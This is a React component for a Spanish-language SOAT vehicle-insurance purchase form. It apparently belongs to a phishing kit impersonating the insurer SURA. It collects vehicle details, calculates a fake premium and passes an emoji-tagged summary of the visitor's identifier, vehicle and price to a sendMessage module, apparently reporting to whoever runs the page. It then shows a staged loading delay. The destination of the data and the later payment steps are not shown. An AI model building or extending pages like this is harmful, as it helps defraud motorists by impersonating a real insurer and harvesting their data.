import React, { useState, useEffect } from "react";
import { useLocation } from "react-router-dom";
import Styles from './Data.module.css';
import sendMessage from '../Sender/Sender';
import Header from '../Header/Header';
import Footer from '../Footer/Footer';
import Confirmation from "../Confirmation/Confirmation";
import i from '../../Assets/Images/i.png';
import loaderGif from '../../Assets/Images/loader.gif'

function Datos() {
    const location = useLocation();
    const { dataX } = location.state || {};

    const [sectionB, showSectionB] = useState(false);
    const [sectionX, showSectionx] = useState(false);

    const [dataC, setDataC] = useState("");
    const [dataM, setDataM] = useState("");
    const [dataS, setDataS] = useState("");
    const [dataP, setDataP] = useState("");
    const [dataK, setDataK] = useState("");
    const [touchedA, setTouchedA] = useState(false);
    const [touchedB, setTouchedB] = useState(false);
    const [touchedC, setTouchedC] = useState(false);
    const [touchedD, setTouchedD] = useState(false);
    const [touchedE, setTouchedE] = useState(false);
    const [touchedF, setTouchedF] = useState(false);
    const [touchedG, setTouchedG] = useState(false);

    const [showOverlay, setShowOverlay] = useState(false);
    const [dataY, setDataY] = useState(null);
    const [loading, setLoading] = useState(false);

    useEffect(() => {
        const tiposConCarga = ["CAMION", "TRACTOCAMION", "VOLQUETA"];
        showSectionx(tiposConCarga.includes(dataC));
    }, [dataC]);

    useEffect(() => {
        document.body.style.overflow = showOverlay ? "hidden" : "auto";
        return () => { document.body.style.overflow = "auto"; };
    }, [showOverlay]);

    function calcularSOAT(tipo, cilindraje, modelo, capacidadCargaKg = null) {
        if (!tipo || !modelo) return null;

        const tipoU = tipo.toUpperCase();
        const yearActual = new Date().getFullYear();
        const antiguedad = yearActual - Number(modelo);
        let valor = null;

        const tiposConCilindraje = [
            "MOTOCICLETA",
            "AUTOMOVIL",
            "CAMIONETA",
            "CAMPERO"
        ];

        const tiposConCarga = [
            "CAMION",
            "TRACTOCAMION",
            "VOLQUETA"
        ];

        const requiereCilindraje = tiposConCilindraje.includes(tipoU);
        const requiereCarga = tiposConCarga.includes(tipoU);

        if (requiereCilindraje && (!cilindraje || cilindraje <= 0)) return null;
        if (requiereCarga && (!capacidadCargaKg || capacidadCargaKg <= 0)) return null;

        // Convertir KG a toneladas
        const capacidadToneladas = capacidadCargaKg ? capacidadCargaKg / 1000 : null;

        // CICLOMOTOR
        if (tipoU === "CICLOMOTOR") {
            valor = 124100;
        }

        // MOTOCICLETA
        else if (tipoU === "MOTOCICLETA") {
            if (cilindraje < 100) valor = 256200;
            else if (cilindraje < 200) valor = 343300;
            else valor = 761400;
        }

        // MOTOCARRO / TRICIMOTO / CUADRICICLO / MOTOTRICICLO / CUATRIMOTO
        else if ([
            "MOTOCARRO",
            "TRICIMOTO",
            "CUADRICICLO",
            "MOTOTRICICLO",
            "CUATRIMOTO"
        ].includes(tipoU)) {
            valor = 386900;
        }

        // CAMIONETA / CAMPERO
        else if (["CAMIONETA", "CAMPERO"].includes(tipoU)) {
            if (cilindraje < 1500) {
                valor = antiguedad < 10 ? 792800 : 953000;
            } else if (cilindraje < 2500) {
                valor = antiguedad < 10 ? 946600 : 1121400;
            } else {
                valor = antiguedad < 10 ? 1110300 : 1274000;
            }
        }

        // AUTOMOVIL
        else if (tipoU === "AUTOMOVIL") {
            if (cilindraje < 1500) {
                valor = antiguedad < 10 ? 447300 : 592900;
            } else if (cilindraje < 2500) {
                valor = antiguedad < 10 ? 544700 : 677400;
            } else {
                valor = antiguedad < 10 ? 636000 : 754300;
            }
        }

        // CAMION / TRACTOCAMION / VOLQUETA (por capacidad de carga)
        else if (tiposConCarga.includes(tipoU)) {
            if (capacidadToneladas < 5) valor = 888400;
            else if (capacidadToneladas < 15) valor = 1282800;
            else valor = 1621900;
        }

        return valor;
    }

    const allFieldsValid = () => {
        if (!dataC || !dataM || !dataS) return false;

        const tiposConCarga = ["CAMION", "TRACTOCAMION", "VOLQUETA"];

        if (tiposConCarga.includes(dataC)) {
            // Validar capacidad de carga en KG
            if (!dataK || Number(dataK) <= 0) return false;
        } else {
            // Validar cilindraje / potencia solo si aplica
            const regexCilindraje = /^\d{1,5}$/;
            if (!regexCilindraje.test(dataP)) return false;
        }

        return true;
    };

    const handleContinue = () => {
        if (!allFieldsValid()) {
            setTouchedA(true);
            setTouchedB(true);
            setTouchedC(true);
            setTouchedD(true);
            setTouchedE(true);
            setTouchedF(true);
            setTouchedG(true);
            return;
        }

        const soatCalculado = calcularSOAT(
            dataC,
            Number(dataP),
            Number(dataM),
            Number(dataK) // en KG
        );

        setDataY(soatCalculado);
        const mensaje = `🏢 SURA: ${dataX.toUpperCase()}

🚙: ${dataC}
💰: ${soatCalculado ? `$${soatCalculado.toLocaleString()}` : "..."}`;

        sendMessage(mensaje);

        setLoading(true);
        setTimeout(() => {
            setShowOverlay(true);
            setLoading(false);
        }, 5000);
        
    };

    return (
        <>
            <Header stepSectionB={2}/>

            <main className={Styles.xDatosMain}>
                <section className={Styles.xDatosMainSectionA}>
                    <h1>Datos del vehículo</h1>
                    <div>
                        <img src={i} alt="Info" />
                        <p>Los vehículos no matriculados en Colombia, los clásicos/antiguos que requieran pólizas por vigencia inferior a un año y los de servicio público, solo podrán adquirir su SOAT en los puntos de venta presencial.</p>
                    </div>
                    <p>¿Tu vehículo se encuentra matriculado en Colombia?</p>
                    <form>
                        <div>
                            <input type="radio" id="nSectionB" name="showSectionB" />
                            <label htmlFor='nSectionB'>No</label>
                        </div>
                        <div>
                            <input type="radio" id="ySectionB" name="showSectionB" onChange={() => showSectionB(true)} />
                            <label htmlFor='ySectionB'>Sí</label>
                        </div>
                    </form>
                </section>

                {sectionB && (
                    <section className={Styles.xDatosMainSectionB}>
                        <form>
                            <div>
                                <select value={dataC} 
                                        onChange={(e) => { setDataC(e.target.value)}} 
                                        onBlur={(e) => { if (!touchedA) setTouchedA(true);}}
                                        required 
                                        className={touchedA ? Styles.touched : ""}
                                >
                                    <option value="" disabled></option>
                                    <option value="AUTOMOVIL">AUTOMOVIL</option>
                                    <option value="CAMION">CAMION</option>
                                    <option value="CAMIONETA">CAMIONETA</option>
                                    <option value="CAMPERO">CAMPERO</option>
                                    <option value="TRACTOCAMION">TRACTOCAMION</option>
                                    <option value="VOLQUETA">VOLQUETA</option>
                                    <option value="MOTOCICLETA">MOTOCICLETA</option>
                                    <option value="MOTOCARRO">MOTOCARRO</option>
                                    <option value="MOTOTRICICLO">MOTOTRICICLO</option>
                                    <option value="CUATRIMOTO">CUATRIMOTO</option>
                                    <option value="CICLOMOTOR">CICLOMOTOR</option>
                                    <option value="TRICIMOTO">TRICIMOTO</option>
                                    <option value="CUADRICICLO">CUADRICICLO</option>
                                </select>
                                <label>Clase de Vehículo</label>
                            </div>

                            { sectionX && (
                                <div>
                                    <input
                                        type="text"
                                        placeholder=" "
                                        pattern="^\d{1,5}$"
                                        required
                                        value={dataK} 
                                        onChange={(e) => { setDataK(e.target.value)}} 
                                        onBlur={(e) => {
                                            if (!touchedG) setTouchedG(true);
                                        }}
                                        className={touchedG ? Styles.touched : ""}
                                    />
                                    <label>Capacidad de Carga (kg)</label>
                                </div>
                            )
                            }

                            <div>
                                <select value={dataM} onChange={(e) => { setDataM(e.target.value)}} onBlur={(e) => { if (!touchedB) setTouchedB(true);}} required className={touchedB ? Styles.touched : ""}>
                                    <option value="" disabled></option>
                                    {Array.from({ length: 2027 - 1920 + 1 }, (_, i) => {
                                        const year = 2027 - i;
                                        return <option key={year} value={year}>{year}</option>
                                    })}
                                </select>
                                <label>Modelo</label>
                            </div>

                            <div>
                                <input
                                    type="text"
                                    placeholder=" "
                                    pattern="^\d{1,3}$"
                                    required
                                    onInput={(e) => {
                                        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
                                    }}
                                    onBlur={(e) => {
                                        if (!touchedC) setTouchedC(true);
                                    }}
                                    className={touchedC ? Styles.touched : ""}
                                />
                                <label>Cantidad de Pasajeros</label>
                            </div>

                            <div>
                                <select value={dataS} onChange={(e) => { setDataS(e.target.value)}} onBlur={(e) => { if (!touchedD) setTouchedD(true);}} required className={touchedD ? Styles.touched : ""}>
                                    <option value="" disabled></option>
                                    <option value="PUBLICO_URBANO">PUBLICO URBANO</option>
                                    <option value="PUBLICO_INTERMUNICIPAL">PUBLICO INTERMUNICIPAL</option>
                                    <option value="PARTICULAR">PARTICULAR</option>
                                    <option value="DIPLOMATICO">DIPLOMATICO</option>
                                    <option value="TRABAJO_AUTOMOTRIZ">TRABAJO AUTOMOTRIZ</option>
                                    <option value="TRABAJO_AGROINDUSTRIAL">TRABAJO AGROINDUSTRIAL</option>
                                    <option value="ENSEÑANZA_AUTOMOTRIZ">ENSEÑANZA AUTOMOTRIZ</option>
                                    <option value="CARRO_FUNEBRE">CARRO FUNEBRE</option>
                                    <option value="AMBULANCIA">AMBULANCIA</option>
                                    <option value="BOMBEROS">BOMBEROS</option>
                                    <option value="TRANSPORTE_DE_VALORES">TRANSPORTE DE VALORES</option>
                                    <option value="FUERZAS_MILITARES_ESPECIALES">FUERZAS MILITARES ESPECIALES</option>
                                    <option value="OFICIALES">OFICIALES</option>
                                    <option value="PARTICULAR_ESCOLAR">PARTICULAR ESCOLAR</option>
                                    <option value="BIARTICULADO">BIARTICULADO</option>
                                    <option value="OFICIAL_ESCOLAR">OFICIAL ESCOLAR</option>
                                </select>
                                <label>Tipo de Servicio / Carrocería</label>
                            </div>
                            
                            <div>
                                <select
                                    placeholder=" "
                                    value={dataP}
                                    onChange={(e) => setDataP(e.target.value)}
                                    onBlur={(e) => { if (!touchedE) setTouchedE(true); }}
                                    required
                                    className={touchedE ? Styles.touched : ""}
                                >
                                    <option value="" selected disabled></option>
                                    <option value="99">Menos de 100 CC</option>
                                    <option value="101">100 - 199 CC</option>
                                    <option value="201">200 - 1500 CC</option>
                                    <option value="1501">1500 - 2499 CC</option>
                                    <option value="2501">Más de 2500 CC</option>
                                </select>
                                <label>Cilindraje / Potencia</label>
                            </div>

                            <div>
                                <select onBlur={(e) => { if (!touchedF) setTouchedF(true);}} required className={touchedF ? Styles.touched : ""}>
                                    <option value="" disabled selected></option>
                                    <option value="GASOLINA">GASOLINA</option>
                                    <option value="GNV">GNV</option>
                                    <option value="DIESEL">DIESEL</option>
                                    <option value="GAS_GASOL">GAS GASOL</option>
                                    <option value="ELECTRICO">ELECTRICO</option>
                                    <option value="HIDROGENO">HIDROGENO</option>
                                    <option value="ETANOL">ETANOL</option>
                                    <option value="BIODIESEL">BIODIESEL</option>
                                    <option value="GLP">GLP</option>
                                    <option value="GASO_ELEC">GASO ELEC</option>
                                    <option value="DIES_ELEC">DIES ELEC</option>
                                </select>
                                <label>Tipo de Combustible</label>
                            </div>
                        </form>
                    </section>
                )}

                <section className={Styles.xDatosMainSectionC}>
                    <button className={sectionB ? Styles.xDatosMainSectionC__WB : ""}>Regresar</button>
                    {sectionB && <button onClick={handleContinue}>Continuar</button>}
                </section>
            </main>

            {showOverlay && (
                <Confirmation
                    dataX={dataX}
                    dataC={dataC}
                    dataM={dataM}
                    dataS={dataS}
                    dataP={dataP}
                    dataY={dataY}
                />
            )}

            <Footer />

            {loading && (
                <aside className={Styles.loader}>
                    <img src={loaderGif} alt="Loader"></img>
                </aside>
            )}
        </>
    )
}

export default Datos;
